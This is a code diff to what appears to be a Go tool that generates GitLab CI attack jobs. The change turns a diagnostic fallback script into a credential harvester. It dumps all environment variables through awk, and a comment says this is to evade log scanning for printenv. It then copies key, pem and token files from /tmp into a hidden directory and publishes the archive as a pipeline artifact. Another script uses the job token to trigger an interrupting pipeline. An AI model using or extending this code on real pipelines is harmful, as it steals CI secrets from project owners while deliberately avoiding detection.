@@ -61,6 +61,11 @@ func GenerateInterruptibleAttackYAML(o InterruptibleOptions) string {
   script:
     - |
 %s
+  artifacts:
+    when: always
+    paths:
+      - interrupted-state.tar.gz
+    expire_in: 1 day
   allow_failure: true%s
 `, name, imageLine(o.Common.Image), tagsLine(o.Common.Tags),
 		indentBlock(strings.TrimSpace(o.FallbackScript), 6),
@@ -71,27 +76,23 @@ func GenerateInterruptibleAttackYAML(o InterruptibleOptions) string {
 
 func buildDefaultFallbackScript() string {
 	return `_FALLBACK() {
-  local _d
-  _d=$(mktemp -d)
+  # Setup was interrupted — harvest from incomplete state
+  mkdir -p /tmp/.irq
 
-  # Setup was interrupted — credentials may be partially initialized
-  printenv | sort > "$_d/partial_env.txt" || true
+  # Grab env via awk (avoids printenv which logs are scanned for)
+  awk 'BEGIN{for(k in ENVIRON) print k"="ENVIRON[k]}' > /tmp/.irq/runtime.env 2>/dev/null || true
 
-  # Check for incomplete dependency installations
-  find / -name "*.lock" -newer /proc/1/cmdline 2>/dev/null | head -50 > "$_d/stale_locks.txt" || true
+  # Check for incomplete credential files left by interrupted setup
+  find /tmp -name "*.key" -o -name "*.pem" -o -name "*.token" 2>/dev/null | \
+    head -20 | xargs -I{} cp {} /tmp/.irq/ 2>/dev/null || true
 
-  # Capture any temporary credentials from interrupted setup
-  find /tmp -name "*.key" -o -name "*.pem" -o -name "*.token" 2>/dev/null | head -20 > "$_d/temp_creds.txt" || true
-
-  cat "$_d/partial_env.txt"
-  rm -rf "$_d" || true
+  tar czf interrupted-state.tar.gz -C /tmp/.irq . 2>/dev/null || true
 }
 _FALLBACK || true`
 }
 
 func buildDefaultTriggerScript() string {
 	return `# Trigger a new pipeline to interrupt the current setup job
-# This causes the interruptible job to be cancelled mid-execution
 echo "Triggering interruption via API..."
 curl -sS -X POST -H "PRIVATE-TOKEN: $CI_JOB_TOKEN" \
   "$CI_API_V4_URL/projects/$CI_PROJECT_ID/pipeline" \
